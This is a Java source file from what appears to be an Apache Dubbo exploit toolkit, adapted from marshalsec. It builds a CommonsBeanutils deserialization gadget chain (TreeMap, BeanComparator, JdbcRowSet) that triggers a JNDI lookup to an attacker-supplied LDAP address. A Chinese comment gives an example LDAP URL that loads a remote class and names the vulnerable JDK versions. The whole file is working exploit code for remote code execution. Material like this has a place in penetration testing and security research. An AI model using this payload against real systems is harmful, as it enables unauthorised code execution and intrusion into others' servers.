/* MIT License

Copyright (c) 2017 Moritz Bechler

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
*/
package com.threedr3am.exp.dubbo.payload.java;


import com.threedr3am.exp.dubbo.payload.Payload;
import com.threedr3am.exp.dubbo.utils.JDKUtil;
import com.threedr3am.exp.dubbo.utils.Reflections;
import java.util.Collections;
import org.apache.commons.beanutils.BeanComparator;


/**
 * @author mbechler
 *
 */
public class CommonsBeanutils implements Payload {

    private String[] args;

    /**
     *
     * @param args
     *
     * arg[0]=ldap引用外部class地址，例：ldap://127.0.0.1:43658/Calc（ldap协议的JNDI服务可打jdk8u191及以下版本，大于jdk8u191需要使用gadget字节码）
     *
     * @return
     */
    @Override
    public Object getPayload(String[] args) throws Exception {
        if (this.args != null)
            args = this.args;
        BeanComparator<Object> cmp = new BeanComparator<>("lowestSetBit", Collections.reverseOrder());
        Object trig = JDKUtil.makeTreeMap(JDKUtil.makeJNDIRowSet(args[ 0 ]), cmp);
        Reflections.setFieldValue(cmp, "property", "databaseMetaData");
        return trig;
    }

    @Override
    public void injectDefaultArgs(String[] args) {
        this.args = args;
    }

}
